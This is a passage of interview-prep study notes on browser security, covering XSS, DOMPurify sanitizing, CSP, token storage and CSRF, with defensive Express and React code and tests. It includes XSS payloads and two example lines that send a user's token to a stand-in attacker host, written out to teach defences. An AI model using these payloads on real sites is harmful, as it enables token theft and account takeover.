@section Web Security (Browser)
@icon 🛡️
@color #ef4444
@desc From your "Browser Security" notes, in learning order: XSS and React's escaping, sanitizing HTML, Content Security Policy, where to keep tokens, CSRF, clickjacking, and secrets in frontend code. Every defence was tested in real Chrome.

=== What is XSS, and how does React protect you from it?
@p 3
@tags security, xss, react, frontend
@quick
- **XSS (cross-site scripting)**: attacker-controlled JavaScript runs **on your origin**: it can read the page, call your APIs as the user and steal tokens kept in `localStorage`.
- Types: **stored** (saved in the DB, e.g. a comment), **reflected** (from the URL), **DOM-based** (client code writes untrusted data into the DOM).
- React **escapes** everything rendered with `{value}` (shown as text), and React 19 **blocks `javascript:` URLs** in `href`.
- Escape hatches that execute: `dangerouslySetInnerHTML`, `el.innerHTML = …`, `eval`, `new Function`, `setTimeout('string')`, untrusted third-party scripts. Measured in Chrome: an `innerHTML` payload **executed** without other defences.
- Defend in layers: never trust input, render as text, sanitize when HTML is required, validate on the backend, add a CSP.

::: text 🧒 In simple words
XSS is like someone slipping a **note with instructions into your shop's announcement system**. If the system reads every note aloud as an order, the stranger now controls your shop. React's default is to read notes **as plain text**, never as instructions, unless you explicitly switch that off.
:::

::: text 📖 Detailed answer
### The three kinds
| Type | Where the payload lives | Example |
|---|---|---|
| Stored | your database | a comment `<img src=x onerror=…>` shown to every visitor |
| Reflected | the request (URL, form) | `/search?q=<script>…` echoed into the page |
| DOM-based | client-side code | `out.innerHTML = location.hash.slice(1)` |

### What React does for you
- `{userInput}` inside JSX is **escaped**: `<` becomes `&lt;`, so it's displayed, not executed (verified with `renderToString`: `<p>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</p>`).
- Attribute values are escaped too.
- React 19 replaces `javascript:` URLs in `href` with code that throws ("React has blocked a javascript: URL as a security precaution").

### Where React can't help
| Code | Result |
|---|---|
| `<div dangerouslySetInnerHTML={{ __html: input }} />` | raw HTML → runs |
| `ref.current.innerHTML = input` | runs |
| `<a href={userUrl}>` in React 18 and older | `javascript:` runs |
| `eval(input)`, `new Function(input)` | runs |
| markdown → HTML without sanitizing | runs |
| compromised third-party script/npm package | runs with full access |

### Defence in depth (from your notes)
1. Never rely on user input; validate on the frontend **and** backend.
2. Render as text; avoid `dangerouslySetInnerHTML`.
3. Sanitize HTML when you must render it (DOMPurify).
4. Add a Content Security Policy.
5. Keep auth tokens out of JavaScript's reach (HttpOnly cookies).
:::

::: diagram How an XSS payload reaches the DOM
flowchart LR
  A["attacker input: comment, URL, profile name"] --> S{"how is it rendered?"}
  S -->|"JSX {value}"| T["escaped: shown as text (safe)"]
  S -->|"innerHTML or dangerouslySetInnerHTML"| H["parsed as HTML"]
  H --> X["onerror or script runs on your origin"]
  X --> D["steal tokens, call APIs as the user, deface the page"]
:::

::: image XSS and what React protects you from
/images/security/xss-react.svg
:::

::: text 🪜 Step by step
A stored XSS through a comment box:
1. The attacker posts `<img src=x onerror="fetch('https://evil.example?c='+localStorage.token)">`.
2. The backend stores it without validation.
3. The comment list renders it with `dangerouslySetInnerHTML` to support formatting.
4. Every visitor's browser loads the broken image, fires `onerror`, and sends their token to the attacker.
5. Fixes, in layers: render as text (or sanitize), keep tokens in HttpOnly cookies, and a CSP that blocks inline handlers.
:::

::: code tsx Safe and unsafe rendering in React
import DOMPurify from 'dompurify';

type Comment = { id: number; author: string; body: string; website: string };

export function CommentItem({ c }: { c: Comment }) {
  const safeHref = /^https?:\/\//i.test(c.website) ? c.website : undefined;   // allow only http(s) links
  return (
    <article>
      <h4>{c.author}</h4>                                  {/* ✅ escaped automatically */}
      <p>{c.body}</p>                                      {/* ✅ shown as text, never executed */}
      {safeHref && <a href={safeHref} rel="noopener noreferrer" target="_blank">website</a>}
    </article>
  );
}

// ❌ never do this with untrusted data
export function UnsafeComment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ if formatted HTML is really required: sanitize right before rendering
export function RichComment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}
:::

::: code javascript What escaping does (runnable)
// The same transformation React applies to {value} in JSX.
function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (ch) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' }[ch]));
}
const payload = '<img src=x onerror="alert(1)">';
const escaped = escapeHtml(payload);
console.log(escaped);
console.log('no raw angle brackets or quotes survive', !/[<>"]/.test(escaped) ? '✅' : '❌ FAIL');
console.log('the text still reads the same to a user', escaped.includes('onerror') && escaped.startsWith('&lt;img') ? '✅' : '❌ FAIL');

// Allow-listing URL schemes stops javascript: links
const isSafeUrl = (u) => { try { return ['http:', 'https:', 'mailto:'].includes(new URL(u, 'https://app.example').protocol); } catch { return false; } };
console.log('javascript: URLs rejected', !isSafeUrl('javascript:alert(1)') && !isSafeUrl(' JaVaScRiPt:alert(1)') && isSafeUrl('https://ok.example') ? '✅' : '❌ FAIL');
:::

::: warning ⚠️ Common mistakes
- Thinking "React is safe" means no XSS is possible (escape hatches and third-party scripts).
- Using `dangerouslySetInnerHTML` for markdown/CMS content without sanitizing.
- Putting user-controlled URLs into `href`/`src` without allow-listing schemes (older React versions run `javascript:`).
- Validating only on the frontend.
- Storing tokens in `localStorage`, which turns any XSS into account takeover.
:::

::: understand
- XSS = attacker code running as you; React's escaping is the first layer, not the only one.
:::

::: ask
- *"Where do we render HTML that came from users or a CMS?"* That's where sanitizing and CSP matter most.
:::

::: important ⭐ Say this in the interview
"XSS is when attacker-controlled JavaScript runs on our origin, so it can read the page, call our APIs as the user and steal anything JavaScript can reach. It can be stored, reflected or DOM-based. React escapes values rendered in JSX, so user input shows up as text, and React 19 also blocks javascript: URLs, but dangerouslySetInnerHTML, innerHTML, eval and third-party scripts bypass that. So I render as text by default, sanitize with DOMPurify when HTML is really needed, validate on the backend, keep tokens in HttpOnly cookies and add a Content Security Policy as a second layer."
:::

::: links
OWASP: Cross-site scripting | https://owasp.org/www-community/attacks/xss/
OWASP XSS Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
React: dangerouslySetInnerHTML | https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
:::

=== How do you sanitize HTML safely? (DOMPurify)
@p 2
@tags security, xss, sanitize, dompurify
@quick
- **Sanitizing** = removing dangerous tags and attributes from untrusted HTML while keeping safe formatting.
- Use a maintained library: **DOMPurify** (`DOMPurify.sanitize(dirty)`); never write your own regex sanitizer.
- Measured (DOMPurify 3.4): removed `onerror`/`onmouseover` handlers, `<script>`, `<iframe>`, `javascript:` links and a mutation-XSS (`<math>…<style>`) payload; kept `<p>`, `<b>`, `<a>`.
- Sanitize **right before rendering** (and validate/strip on the server too); restrict with `ALLOWED_TAGS`/`ALLOWED_ATTR` for your use case.
- Not needed when you never render HTML (plain text, `textContent`, JSX `{value}`).

::: text 🧒 In simple words
Sanitizing is a **security guard checking bags at the door**: books and umbrellas are fine (`<p>`, `<b>`), but anything that could be used as a weapon (`<script>`, `onerror=`) is taken out before the bag goes in. You hire a professional guard (DOMPurify) rather than training a volunteer with a checklist (regex).
:::

::: text 📖 Detailed answer
### When you need it
| Situation | Sanitize? |
|---|---|
| rich text editor content (comments, posts) | ✅ |
| CMS HTML, markdown converted to HTML | ✅ |
| emails or HTML from third parties | ✅ |
| plain text displayed with `{value}` or `textContent` | ❌ (already safe) |
| HTML you write and fully control | ❌ |

### Why not regex?
HTML parsing is full of edge cases: mixed case (`<ScRiPt>`), encoded characters, SVG/MathML namespaces, browser "mutation" quirks where HTML changes meaning after being parsed twice (mXSS). DOMPurify uses the browser's own parser and an allow-list, and is updated when new bypasses are found.

### Measured: DOMPurify 3.4 on real payloads
| Input | Output |
|---|---|
| `<img src=x onerror="alert(1)">` | `<img src="x">` |
| `<script>alert(1)</script><p>hi</p>` | `<p>hi</p>` |
| `<a href="javascript:alert(1)">click</a>` | `<a>click</a>` |
| `<svg><script>alert(1)</script></svg>` | `<svg></svg>` |
| `<iframe src="https://evil…">` | (removed) |
| `<b onmouseover=alert(1)>bold</b>` | `<b>bold</b>` |
| mutation XSS via `<math>…<style><img onerror>` | `<math><mtext><table></table></mtext></math>` |
It kept one `style="background:url(javascript:…)"` attribute: modern browsers don't execute `javascript:` in CSS, but restricting `style` with `ALLOWED_ATTR` is still cleaner.

### Configuration
- `DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'], ALLOWED_ATTR: ['href'] })`.
- Add `rel="noopener noreferrer"` to links with a hook.
- On the server (Node), use DOMPurify with jsdom, or `sanitize-html`.
:::

::: diagram Where sanitizing fits
flowchart LR
  U["untrusted HTML"] --> V["server: validate length and type"]
  V --> DB["store"]
  DB --> R["render"]
  R --> S["DOMPurify.sanitize with an allow-list"]
  S --> D["dangerouslySetInnerHTML or innerHTML"]
  CSP["CSP blocks what slips through"] -.-> D
:::

::: image Sanitizing HTML with DOMPurify (measured)
/images/security/sanitize.svg
:::

::: text 🪜 Step by step
Rendering a user's rich-text bio safely:
1. The editor produces HTML; the server limits its size and stores it.
2. On render: `const clean = DOMPurify.sanitize(bio, { ALLOWED_TAGS: ['b', 'i', 'a', 'p'], ALLOWED_ATTR: ['href'] })`.
3. Links are forced to open safely via a DOMPurify hook (`rel="noopener noreferrer"`).
4. `<div dangerouslySetInnerHTML={{ __html: clean }} />`.
5. A CSP without `'unsafe-inline'` blocks anything a future DOMPurify bypass might let through.
:::

::: code tsx SafeHtml component with DOMPurify and an allow-list
import DOMPurify from 'dompurify';
import { useMemo } from 'react';

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

const CONFIG = { ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'code'], ALLOWED_ATTR: ['href'] };

export function SafeHtml({ html }: { html: string }) {
  const clean = useMemo(() => DOMPurify.sanitize(html, CONFIG), [html]);
  return <div className="rich" dangerouslySetInnerHTML={{ __html: clean }} />;
}
:::

::: code javascript Why a regex "sanitizer" fails (runnable)
// A naive sanitizer someone might write; each payload below gets through.
const naive = (html) => html.replace(/<script.*?>.*?<\/script>/gi, '').replace(/ on\w+=".*?"/gi, '');
const payloads = [
  '<img src=x onerror=alert(1)>',                 // handler without quotes
  '<img src=x onerror\t="alert(1)">',              // tab instead of a space
  '<scr<script></script>ipt>alert(1)</script>',    // nested tag rebuilt after removal
  '<a href="javascript:alert(1)">x</a>',           // not a handler or script at all
];
const stillDangerous = payloads.map(naive).filter((h) => /onerror|<script|javascript:/i.test(h));
console.log(payloads.map(naive));
console.log(`naive regex left ${stillDangerous.length}/${payloads.length} payloads dangerous`, stillDangerous.length === payloads.length ? '✅ (lesson: use DOMPurify)' : '❌ FAIL');
:::

::: warning ⚠️ Common mistakes
- Home-made regex sanitizers.
- Sanitizing once on input and then trusting the stored HTML forever (sanitize at render; libraries improve).
- Allowing `style`, `iframe`, `form` or event attributes "just in case".
- Sanitizing and then modifying the HTML again (string concatenation can re-introduce payloads).
:::

::: understand
- Sanitize = allow-list what's needed, with a library that tracks new bypasses; still back it with CSP.
:::

::: ask
- *"Which tags does this feature actually need?"* Start from that allow-list.
:::

::: important ⭐ Say this in the interview
"Sanitizing means removing dangerous tags and attributes from untrusted HTML and keeping safe formatting. I use DOMPurify with an allow-list of the tags and attributes the feature needs, right before rendering with dangerouslySetInnerHTML, and I never write regex sanitizers because of encoding tricks and mutation XSS. In a test DOMPurify removed event handlers, script tags, iframes, javascript links and a mutation-XSS payload. If I never render HTML, React's escaping is enough, and a Content Security Policy backs everything up."
:::

::: links
DOMPurify | https://github.com/cure53/DOMPurify
OWASP: HTML sanitization | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization
:::

=== What is Content Security Policy (CSP), and how does it stop XSS even if sanitization fails?
@p 3
@tags security, csp, xss, headers
@quick
- **CSP** is an HTTP response header that tells the browser **which scripts, styles, images, frames and connections are allowed**; anything else is blocked.
- A strict policy blocks **inline scripts, inline event handlers, `eval` and unknown origins**, which is how most XSS payloads run.
- Allow your own inline scripts with a per-request **nonce** (`script-src 'self' 'nonce-…'`) or hashes; avoid `'unsafe-inline'` and `'unsafe-eval'`.
- Measured in Chrome: the same `innerHTML` XSS **executed without CSP** and was **blocked with CSP** (1 `securitypolicyviolation` event), while the page's nonce script still ran.
- Roll out with `Content-Security-Policy-Report-Only` + `report-to`, then enforce. CSP is a **second layer**, not a replacement for escaping/sanitizing.

::: text 🧒 In simple words
CSP is a **guest list at the door of your page**. Even if a troublemaker (injected script) sneaks a note inside, the bouncer checks every script: "Are you on the list? Do you have today's wristband (nonce)?" No wristband, no entry.
:::

::: text 📖 Detailed answer
### Key directives
| Directive | Controls | Typical value |
|---|---|---|
| `default-src` | fallback for everything | `'self'` |
| `script-src` | JavaScript | `'self' 'nonce-{random}'` (+ `'strict-dynamic'`) |
| `style-src` | CSS | `'self'` (+ nonce) |
| `img-src` | images | `'self' data: https://cdn.example` |
| `connect-src` | fetch/XHR/WebSocket | `'self' https://api.example` |
| `frame-ancestors` | who may frame you (clickjacking) | `'none'` |
| `object-src` | plugins | `'none'` |
| `base-uri` | `<base>` hijacking | `'self'` |
| `form-action` | where forms submit | `'self'` |
| `report-to` / `report-uri` | violation reports | your endpoint |

### Nonces
The server generates a random value per response, sends it in the header and puts it on legitimate `<script nonce="…">` tags. Injected scripts can't guess it. With `'strict-dynamic'`, scripts loaded by a trusted script are trusted too (works well with bundlers).

### What CSP blocks (measured in Chrome)
| Attempt | Result |
|---|---|
| `innerHTML = '<img src=x onerror=…>'` without CSP | executed |
| the same with `script-src 'self' 'nonce-…'` | blocked, 1 violation event |
| the page's own `<script nonce>` | ran |

### Rollout
1. Ship `Content-Security-Policy-Report-Only` and collect reports.
2. Fix legitimate violations (move inline handlers to code, add nonces, list CDNs).
3. Switch to the enforcing header. Next.js supports nonces via Proxy and headers; Helmet sets a default CSP in Express.
:::

::: diagram What the browser does with CSP
flowchart TD
  S["script about to run"] --> N{"matches script-src? (self, nonce, hash)"}
  N -->|"yes"| R["run"]
  N -->|"no"| B["block + securitypolicyviolation event"]
  B --> RP["report-to endpoint (optional)"]
  I["inline onerror handler"] --> B
  E["eval"] --> B
:::

::: image Content Security Policy: a second line of defence (measured)
/images/security/csp.svg
:::

::: text 🪜 Step by step
The measured experiment:
1. A search page puts `?q=` into `innerHTML` (a DOM XSS bug).
2. URL: `/search?q=<img src=x onerror="window.pwned=true">` → in Chrome `window.pwned` became `true`.
3. Same bug, but the server sends `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`.
4. The `onerror` handler is inline JavaScript without a nonce → Chrome blocks it and fires one `securitypolicyviolation` event; `window.pwned` stays `undefined`.
5. The page's own nonce script ran normally. The bug still needs fixing, but it couldn't be exploited.
:::

::: code javascript server.js: a nonce-based CSP in Express (and with Helmet)
const express = require('express');
const crypto = require('node:crypto');
const helmet = require('helmet');

const app = express();

// a fresh nonce for every response
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`, "'strict-dynamic'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
}));

app.get('/', (req, res) => {
  res.send(`<!doctype html><html><body>
    <div id="root"></div>
    <script nonce="${res.locals.nonce}">window.__CONFIG__ = { apiUrl: '/api' };</script>
    <script type="module" src="/assets/app.js"></script>
  </body></html>`);
});

app.listen(3000);
:::

::: code javascript Build and check a CSP string (runnable)
function buildCsp(directives) {
  return Object.entries(directives).map(([k, v]) => `${k} ${v.join(' ')}`).join('; ');
}
const nonce = Math.random().toString(36).slice(2);   // use crypto.randomBytes on the server
const csp = buildCsp({
  'default-src': ["'self'"],
  'script-src': ["'self'", `'nonce-${nonce}'`],
  'object-src': ["'none'"],
  'base-uri': ["'self'"],
  'frame-ancestors': ["'none'"],
});
console.log(csp);
const scriptSrc = csp.split('; ').find((d) => d.startsWith('script-src'));
console.log('no unsafe-inline or unsafe-eval', !/unsafe-(inline|eval)/.test(csp) ? '✅' : '❌ FAIL');
console.log('inline scripts need the nonce', scriptSrc.includes(`'nonce-${nonce}'`) ? '✅' : '❌ FAIL');
console.log('framing is denied', csp.includes("frame-ancestors 'none'") ? '✅' : '❌ FAIL');
:::

::: warning ⚠️ Common mistakes
- `script-src 'unsafe-inline'` (disables most of the protection).
- A static nonce that never changes.
- Allow-listing big CDNs that host arbitrary user content (bypass via JSONP or old libraries).
- Shipping a strict policy without Report-Only first (breaks the app).
- Treating CSP as the fix instead of fixing the injection bug.
:::

::: understand
- CSP limits what an injected payload can do; escaping and sanitizing stop the injection.
:::

::: ask
- *"Which inline scripts and third-party origins does the app rely on?"* They decide the policy.
:::

::: important ⭐ Say this in the interview
"Content Security Policy is a response header that tells the browser which sources of scripts, styles, images, frames and connections are allowed. A strict nonce-based policy blocks inline scripts, inline event handlers, eval and unknown origins, which is how most XSS payloads execute, so even if sanitization fails the payload can't run. In a test, the same innerHTML injection executed without CSP and was blocked with it, while the page's own nonce script ran. I roll it out in report-only mode first, avoid unsafe-inline and unsafe-eval, and also use frame-ancestors against clickjacking."
:::

::: links
MDN: Content Security Policy | https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
web.dev: Strict CSP | https://web.dev/articles/strict-csp
Next.js: Content Security Policy | https://nextjs.org/docs/app/guides/content-security-policy
:::

=== Where should you store auth tokens? (HttpOnly cookies vs localStorage)
@p 3
@tags security, auth, cookies, localstorage, jwt
@quick
- `localStorage`/`sessionStorage` are readable by **any script** on the page: one XSS → the token is sent to the attacker and works from anywhere.
- **HttpOnly** cookies can't be read by JavaScript; **Secure** sends them only over HTTPS; **SameSite** limits cross-site sending.
- Common SPA pattern: **short-lived access token in memory** + **refresh token in an HttpOnly cookie** (`path=/api/auth`), rotated on use.
- Frontend is never the source of truth for auth: the server validates every request; the UI just reacts to 401/403.
- On logout: clear cookies on the server, revoke the refresh token, drop in-memory state. Cookies add CSRF risk → SameSite + CSRF tokens.

::: text 🧒 In simple words
`localStorage` is like keeping your **house key under the doormat**: anyone who gets onto the porch (any script) can take it. An HttpOnly cookie is a key kept in a **lockbox only the door can open**: scripts can't touch it, the browser just presents it when talking to your server.
:::

::: text 📖 Detailed answer
| | `localStorage` token | HttpOnly cookie |
|---|---|---|
| Readable by JS | ✅ (so readable by XSS) | ❌ |
| Sent automatically | ❌ (you add `Authorization`) | ✅ (to its domain/path) |
| XSS impact | token **stolen**, usable elsewhere, until it expires | attacker can act **while the user's page is open**, can't take the token away |
| CSRF risk | none | needs SameSite + CSRF tokens |
| Lifetime | until removed | `Max-Age`/`Expires` |

### Cookie attributes
| Attribute | Purpose |
|---|---|
| `HttpOnly` | no `document.cookie` access |
| `Secure` | HTTPS only (note: so it's not sent to `http://` in tests either) |
| `SameSite=Lax/Strict/None` | when it's sent on cross-site requests |
| `Path=/api/auth` | limit where a refresh cookie goes |
| `Max-Age` | expiry |
| `__Host-` prefix | must be Secure, Path=/, no Domain |

### The recommended SPA flow (this app uses it)
1. Login → server sets `refresh` HttpOnly cookie, returns an access token (15 min) in the JSON body.
2. The SPA keeps the access token **in memory** and sends `Authorization: Bearer …`.
3. On 401 `TOKEN_EXPIRED` → `POST /api/auth/refresh` (cookie sent automatically) → new access token, refresh cookie rotated.
4. Reuse of an old refresh token → server revokes all sessions (theft detection).
5. Logout → server clears the cookie and revokes it.
:::

::: diagram Access token in memory, refresh token in a cookie
sequenceDiagram
  participant B as Browser (SPA)
  participant A as API
  B->>A: "POST /api/auth/login"
  A-->>B: "Set-Cookie refresh (HttpOnly, Secure, SameSite, Path=/api/auth) + accessToken in JSON"
  B->>A: "GET /api/orders, Authorization: Bearer access"
  A-->>B: "401 TOKEN_EXPIRED"
  B->>A: "POST /api/auth/refresh (cookie sent automatically)"
  A-->>B: "new accessToken, rotated refresh cookie"
:::

::: image Where to keep auth tokens
/images/security/token-storage.svg
:::

::: text 🪜 Step by step
Why one XSS is worse with `localStorage`:
1. An XSS runs `fetch('https://evil.example?t=' + localStorage.getItem('token'))`.
2. The attacker now has the token and can use it from their own machine until it expires (often days).
3. With an HttpOnly cookie, `document.cookie` doesn't contain it, so there's nothing to send.
4. The XSS can still make requests **from the victim's page** while it's open, which is why XSS must still be prevented.
5. Short-lived access tokens in memory limit even that window.
:::

::: code javascript auth routes: setting and clearing secure cookies (Express)
const express = require('express');
const crypto = require('node:crypto');
const cookieParser = require('cookie-parser');

const app = express();
app.use(express.json());
app.use(cookieParser());

const isProd = process.env.NODE_ENV === 'production';
const refreshCookie = { httpOnly: true, secure: isProd, sameSite: 'lax', path: '/api/auth', maxAge: 7 * 24 * 3600 * 1000 };
const sessions = new Map();                                  // refreshToken → userId (use a DB table)

app.post('/api/auth/login', (req, res) => {
  const userId = 'u1';                                       // after checking the password hash
  const refresh = crypto.randomBytes(32).toString('base64url');
  sessions.set(refresh, userId);
  res.cookie('refresh', refresh, refreshCookie);
  res.json({ accessToken: `access-for-${userId}`, expiresIn: 900 });   // short-lived, kept in memory
});

app.post('/api/auth/refresh', (req, res) => {
  const old = req.cookies.refresh;
  const userId = old && sessions.get(old);
  if (!userId) return res.status(401).json({ error: 'Session expired' });
  sessions.delete(old);                                      // rotate: old token can't be reused
  const next = crypto.randomBytes(32).toString('base64url');
  sessions.set(next, userId);
  res.cookie('refresh', next, refreshCookie);
  res.json({ accessToken: `access-for-${userId}`, expiresIn: 900 });
});

app.post('/api/auth/logout', (req, res) => {
  sessions.delete(req.cookies.refresh);
  res.clearCookie('refresh', { path: '/api/auth' });
  res.status(204).end();
});

app.listen(3000);
:::

::: code javascript Building a secure Set-Cookie header (runnable)
function serializeCookie(name, value, { httpOnly = true, secure = true, sameSite = 'Lax', path = '/', maxAge } = {}) {
  const parts = [`${name}=${encodeURIComponent(value)}`, `Path=${path}`, `SameSite=${sameSite}`];
  if (maxAge != null) parts.push(`Max-Age=${maxAge}`);
  if (httpOnly) parts.push('HttpOnly');
  if (secure) parts.push('Secure');
  if (sameSite === 'None' && !secure) throw new Error('SameSite=None requires Secure');
  return parts.join('; ');
}
const header = serializeCookie('refresh', 'abc123', { path: '/api/auth', maxAge: 604800 });
console.log(header);
console.log('HttpOnly + Secure + SameSite present', /HttpOnly/.test(header) && /Secure/.test(header) && /SameSite=Lax/.test(header) ? '✅' : '❌ FAIL');
let err = '';
try { serializeCookie('x', '1', { sameSite: 'None', secure: false }); } catch (e) { err = e.message; }
console.log('SameSite=None without Secure is rejected', err === 'SameSite=None requires Secure' ? '✅' : '❌ FAIL');
:::

::: warning ⚠️ Common mistakes
- `localStorage.setItem('token', jwt)` for long-lived tokens.
- Putting sensitive data (roles, PII) in client state or decoded JWTs and trusting it for authorization.
- Long-lived access tokens with no refresh rotation or revocation.
- `secure: true` in local HTTP tests (the cookie is silently not sent) or `secure: false` in production.
- Forgetting CSRF protection once auth moves to cookies.
:::

::: understand
- Keep tokens out of JavaScript's reach, keep them short-lived, and let the server decide every request.
:::

::: ask
- *"Is the API on the same site as the frontend?"* It decides SameSite and cookie domain settings.
:::

::: important ⭐ Say this in the interview
"I don't keep long-lived tokens in localStorage, because any XSS can read and exfiltrate them. I prefer HttpOnly, Secure, SameSite cookies, which JavaScript can't read: typically a short-lived access token kept in memory and a refresh token in an HttpOnly cookie scoped to the auth path, rotated on every refresh, with reuse detection and server-side revocation on logout. The frontend is never the source of truth; the server checks every request and the UI just handles 401s by refreshing or logging out. Because cookies are sent automatically, I pair this with SameSite and CSRF tokens."
:::

::: links
OWASP: Session management cheat sheet | https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
MDN: Set-Cookie | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
:::

=== What is CSRF, and how do you prevent it?
@p 3
@tags security, csrf, cookies, samesite
@quick
- **CSRF (cross-site request forgery)**: another site makes the user's browser send a request to your site, and the browser **attaches your cookies automatically**. HttpOnly doesn't help.
- Measured in Chrome (cross-site): a **form POST** and an **`<img>` GET** carried only `SameSite=None` cookies; a **link click** carried `Lax` and `None` (not `Strict`); same-site requests carried all three.
- Defences: **`SameSite=Lax`/`Strict`** session cookies, a **CSRF token** for state-changing requests, **no side effects on GET**, and checking `Origin`/`Sec-Fetch-Site`.
- The token must be tied to the session (e.g. an HMAC of the session ID) and sent in a header; compare with `timingSafeEqual`.
- `csurf` is **deprecated** (2022): use your framework's built-in protection (Next.js Server Actions check Origin) or a maintained/simple signed token.

::: text 🧒 In simple words
CSRF is like a stranger handing your **signed cheque book** to the bank teller while you're not looking. The teller sees your signature (cookie) and pays. A CSRF token is a **secret word only your real app knows**; the teller asks for it, and the stranger can't provide it.
:::

::: text 📖 Detailed answer
### Why it works
Browsers attach cookies to requests **to** a site, no matter which site **started** the request. A hidden form on `evil.example` posting to `bank.example/transfer` would carry the bank's session cookie, unless SameSite stops it.

### Measured in Chrome (bank on `localhost`, attacker on `127.0.0.1`, cookies `Strict`, `Lax`, `None`)
| Request from the attacker site | Cookies the bank received |
|---|---|
| auto-submitted form POST | `None` only |
| `<img src=…/transfer?to=attacker>` | `None` only |
| user clicks a link (top-level GET) | `Lax`, `None` |
| same-site request (for comparison) | `Strict`, `Lax`, `None` |
So `SameSite=Lax` stops form POSTs, but **a GET with side effects is still exploitable** through a link.

### Defences
1. **SameSite** cookies (`Lax` is the default for cookies without the attribute in Chrome; set it explicitly).
2. **CSRF token** for every state-changing request: the server issues it (e.g. in the login response), the SPA sends it in `X-CSRF-Token`, the server compares it with the value tied to the session.
3. **Safe methods are safe**: GET/HEAD never change data.
4. **Origin checks**: reject state-changing requests whose `Origin` isn't yours, or `Sec-Fetch-Site: cross-site`.
5. Re-authenticate for very sensitive actions (password change, payouts).

### Frameworks
Next.js Server Actions only accept POST and compare `Origin` with `Host`. APIs using `Authorization: Bearer` headers (not cookies) aren't CSRF-prone, since attackers can't add that header cross-site without CORS permission.
:::

::: diagram A forged request and the defences
flowchart LR
  E["evil.example: hidden form"] -->|"POST /transfer"| B["browser"]
  B -->|"attach cookies? SameSite decides"| S["bank.example"]
  S --> C{"CSRF token in header matches session?"}
  C -->|"no"| R["403 rejected"]
  C -->|"yes"| OK["perform transfer"]
  S --> O{"Origin is ours?"}
  O -->|"no"| R
:::

::: image CSRF: forged requests that ride on your cookies (measured)
/images/security/csrf.svg
:::

::: text 🪜 Step by step
The signed double-submit token in the code below:
1. Login creates a session ID in an HttpOnly cookie and returns `csrfToken = HMAC(secret, sessionId)` in JSON.
2. The SPA keeps `csrfToken` in memory and sends `X-CSRF-Token` on POST/PUT/PATCH/DELETE.
3. The middleware recomputes `HMAC(secret, cookie.session)` and compares it with the header using `timingSafeEqual`.
4. A forged cross-site form has the cookie (if SameSite allows) but **no header** → 403 "missing".
5. A token from another user's session doesn't match this session → 403 "invalid". All 3 tests passed.
:::

::: code javascript csrf.test.js: CSRF protection without csurf (3 tests passed with node:test + Supertest)
const { test } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const express = require('express');
const cookieParser = require('cookie-parser');
const request = require('supertest');

const SECRET = 'test-secret-change-me';
const sign = (sessionId) => crypto.createHmac('sha256', SECRET).update(sessionId).digest('base64url');

function createApp() {
  const app = express();
  app.use(express.json());
  app.use(cookieParser());
  app.post('/login', (req, res) => {
    const sessionId = crypto.randomUUID();
    res.cookie('session', sessionId, { httpOnly: true, sameSite: 'lax', secure: process.env.NODE_ENV === 'production' });   // Secure cookies are not sent over plain http (tests)
    res.json({ csrfToken: sign(sessionId) });                       // the SPA keeps this in memory
  });
  function csrfProtection(req, res, next) {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();   // safe methods must not change data
    const session = req.cookies.session;
    const token = req.get('x-csrf-token');
    if (!session || !token) return res.status(403).json({ error: 'CSRF token missing' });
    const expected = Buffer.from(sign(session));
    const given = Buffer.from(token);
    if (expected.length !== given.length || !crypto.timingSafeEqual(expected, given)) return res.status(403).json({ error: 'CSRF token invalid' });
    next();
  }
  app.post('/transfer', csrfProtection, (req, res) => res.json({ ok: true, to: req.body.to }));
  return app;
}

test('a request with the session cookie and the right token is accepted', async () => {
  const agent = request.agent(createApp());
  const { body } = await agent.post('/login').expect(200);
  await agent.post('/transfer').set('x-csrf-token', body.csrfToken).send({ to: 'friend' }).expect(200);
});

test('a forged request (cookie sent automatically, but no token) is rejected', async () => {
  const agent = request.agent(createApp());
  await agent.post('/login').expect(200);
  const res = await agent.post('/transfer').send({ to: 'attacker' }).expect(403);
  assert.equal(res.body.error, 'CSRF token missing');
});

test("a token from another user's session is rejected", async () => {
  const app = createApp();
  const victim = request.agent(app);
  const attacker = request.agent(app);
  await victim.post('/login');
  const { body } = await attacker.post('/login');
  const res = await victim.post('/transfer').set('x-csrf-token', body.csrfToken).send({ to: 'attacker' }).expect(403);
  assert.equal(res.body.error, 'CSRF token invalid');
});
:::

::: code javascript Which cookies does a cross-site request carry? (runnable model of the measurement)
// Model of the SameSite rules Chrome applied in the measurement.
function cookiesSent(cookies, { crossSite, method, topLevelNavigation }) {
  return cookies.filter((c) => {
